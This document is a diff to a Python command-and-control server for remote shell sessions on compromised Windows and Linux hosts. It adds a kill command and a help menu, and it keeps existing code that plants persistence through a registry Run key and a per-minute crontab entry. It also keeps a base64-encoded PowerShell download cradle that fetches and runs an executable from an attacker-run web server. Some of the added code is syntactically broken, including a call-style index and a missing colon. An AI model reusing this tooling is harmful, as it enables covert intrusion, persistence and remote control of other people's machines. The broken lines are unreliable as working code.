@@ -1,3 +1,4 @@
+import base64
 import os
 import os.path
 import random
@@ -7,7 +8,6 @@ import string
 import subprocess
 import threading
 import time
-import base64
 from datetime import datetime
 
 from prettytable import PrettyTable
@@ -34,40 +34,55 @@ def comm_out(targ_id, message):
     targ_id.send(message.encode())
 
 
+def kill_sig(targ_id, message):
+    message = str(message)
+    targ_id.send(message.encode())
+
+
 def target_comm(targ_id, targets, num):
     while True:
-        message = input("send message#>")
+        message = input(f"{targets[num][3]}/{targets[num][1]}#> ")
         comm_out(targ_id, message)
-        if message == "exit":
-            targ_id.send(message.encode())
-            targ_id.close()
-            targets[num][7] = "Dead"
-            break
-        if message == "background":
-            break
-        if message == "persist":
-            payload_name = input(
-                "[+] Enter the name of the payload to add to autorun: "
-            )
-            if targets[num][6] == 1:
-                persist_command_1 = f"cmd.exe /c copy {payload_name} C:\\Users\\Public"
-                targ_id.send(persist_command_1.encode())
-                persist_command_2 = f"reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v screendoor /t REG_SZ /d C:\\Users\\Public\\{payload_name}"
-                targ_id.send(persist_command_2.encode())
-                print(
-                    "[+] Run this command to clean up the registry: \nreg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v screendoor /f"
+        if len(message) == 0:
+            continue
+        if message == "help":
+            pass
+        else:
+            comm_out(targ_id, message)
+            if message == "exit":
+                targ_id.send(message.encode())
+                targ_id.close()
+                targets[num][7] = "Dead"
+                break
+            if message == "background":
+                break
+            if message == "help":
+                break
+            if message == "persist":
+                payload_name = input(
+                    "[+] Enter the name of the payload to add to autorun: "
                 )
-            elif targets[num][6] == 2:
-                persist_command = f'echo "*/1 * * * * python3 /home/{targets[num][3]}/{payload_name}" | crontab -'
-                targ_id.send(persist_command.encode())
-                print("[+] Run this command to clean up the crontab: \ncrontab -r")
-            else:
-                response = comm_in(targ_id)
-                if response == "exit":
-                    print("[-] The client has terminated the session.")
-                    targ_id.close()
-                    break
-                print(response)
+                if targets[num][6] == 1:
+                    persist_command_1 = (
+                        f"cmd.exe /c copy {payload_name} C:\\Users\\Public"
+                    )
+                    targ_id.send(persist_command_1.encode())
+                    persist_command_2 = f"reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v screendoor /t REG_SZ /d C:\\Users\\Public\\{payload_name}"
+                    targ_id.send(persist_command_2.encode())
+                    print(
+                        "[+] Run this command to clean up the registry: \nreg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v screendoor /f"
+                    )
+                elif targets[num][6] == 2:
+                    persist_command = f'echo "*/1 * * * * python3 /home/{targets[num][3]}/{payload_name}" | crontab -'
+                    targ_id.send(persist_command.encode())
+                    print("[+] Run this command to clean up the crontab: \ncrontab -r")
+                else:
+                    response = comm_in(targ_id)
+                    if response == "exit":
+                        print("[-] The client has terminated the session.")
+                        targ_id.close()
+                        break
+                    print(response)
 
 
 def listener_handler():
@@ -214,24 +229,52 @@ def exeplant():
     else:
         print("[-] Some error occured during generation.")
 
+
 def pshell_cradle():
-    web_server_ip = input('[+] Web server listening host:')
-    web_server_port = input('[+] Web server port:')
-    payload_name = input('[+] Payload name:')
-    runner_file = (''.join(random.choices(string.ascii_lowercase, k=6)))
-    runner_file = f'{runner_file}.txt'
-    randomised_exe_file = (''.join(random.choices(string.ascii_lowercase, k=6)))
-    randomised_exe_file = f'{randomised_exe_file}.exe'
-    print(f'[+] Run the following command to start a web server.\npython3 -m http.server -b {web_server_ip} {web_server_port}')
-    runner_cal_unencoded = f"iex (new-object net.webclient).downloadingstring('http://{web_server_ip}:{web_server_port}/{runner_file}')".encode('utf-16le')
-    with open(runner_file, 'w') as f:
-        f.write(f'powershell -c wget http://{web_server_ip}:{web_server_port}/{payload_name} -outfile {randomised_exe_file}; Start-Process -FilePath {randomised_exe_file}')
+    web_server_ip = input("[+] Web server listening host:")
+    web_server_port = input("[+] Web server port:")
+    payload_name = input("[+] Payload name:")
+    runner_file = "".join(random.choices(string.ascii_lowercase, k=6))
+    runner_file = f"{runner_file}.txt"
+    randomised_exe_file = "".join(random.choices(string.ascii_lowercase, k=6))
+    randomised_exe_file = f"{randomised_exe_file}.exe"
+    print(
+        f"[+] Run the following command to start a web server.\npython3 -m http.server -b {web_server_ip} {web_server_port}"
+    )
+    runner_cal_unencoded = f"iex (new-object net.webclient).downloadingstring('http://{web_server_ip}:{web_server_port}/{runner_file}')".encode(
+        "utf-16le"
+    )
+    with open(runner_file, "w") as f:
+        f.write(
+            f"powershell -c wget http://{web_server_ip}:{web_server_port}/{payload_name} -outfile {randomised_exe_file}; Start-Process -FilePath {randomised_exe_file}"
+        )
         f.close()
     b64_runner_cal = base64.b64encode(runner_cal_unencoded)
     b64_runner_cal = b64_runner_cal.decode()
-    print(f'\n[+] Encoded payload\npowershell -e {b64_runner_cal}')
+    print(f"\n[+] Encoded payload\npowershell -e {b64_runner_cal}")
     b64_runner_cal_decoded = base64.b64decode(b64_runner_cal).decode()
-    print(f'\n[+] Unencoded payload\n[{b64_runner_cal_decoded}')
+    print(f"\n[+] Unencoded payload\n[{b64_runner_cal_decoded}")
+
+
+def help():
+    print("""
+        ------------------------
+        :: Menu Commands ::
+        ------------------------
+        listeners -g --> Generate a new listener
+        winplant py --> Generate a Windows Compatible Python Payload
+        linplant py --> Generate a Linux Compatible Python Payload
+        exeplant py --> Generate an executable payload for Windows
+        sessions -l --> List all active sessions
+        sessions -i <val> --> Enter a new session
+        kill <val> --> Kills an active session
+
+        ------------------------
+        :: Session Commands ::
+        ------------------------
+        background --> Background the current session
+        exit --> Terminates the current session
+        """)
 
 
 if __name__ == "__main__":
@@ -243,12 +286,14 @@ if __name__ == "__main__":
     while True:
         try:
             command = input("Enter command#>")
+            if command == "help":
+                help()
             if command == "listeners -g":
                 host_ip = input("[+] Enter the IP to listen on: ")
                 host_port = input("[+] Enter the port to listen on: ")
                 listener_handler()
                 listener_counter += 1
-            if command == 'pshel_shell':
+            if command == "pshel_shell":
                 pshell_cradle()
             if command == "winplant py":
                 if listener_counter > 0:
@@ -313,6 +358,33 @@ if __name__ == "__main__":
                             print("[-] Please specify a session number.")
                         else:
                             print(f"[-] Session {num} does not exist.")
+                        if command.split(" ")[0] == "kill":
+                            try:
+                                num = int(command.split(" ")[1])
+                                targ_id = (targets[num](0))
+                                if (targets[num])[7] == "Active"
+                                    kill_sig(targ_id, "exit")
+                                    targets[num][7] = "Dead"
+                                    print(f"[+] Session {num} terminated.")
+                                else:
+                                    print("[-] You cannot interact with a dead session.")
+                            except (IndexError, ValueError):
+                                print(f"[-] Session {num} does not exist.")
+                        if command == "exit":
+                            quit_message = input("Ctrl-C\n[+] Do you really want to quit? (y/n)").lower()
+                            if quit_message == "y":
+                                tar_length = len(targets)
+                                for target in targets:
+                                    if target[7] == "Dead":
+                                        pass
+                                    else:
+                                        comm_out(target[0], "exit")
+                                kill_flag = 1
+                                if listener_counter > 0:
+                                    sock.close()
+                                break
+                            else:
+                                continue
 
         except KeyboardInterrupt:
             quit_message = input("Ctrl-C\n[+] Do you want to quit? (y/n)").lower()
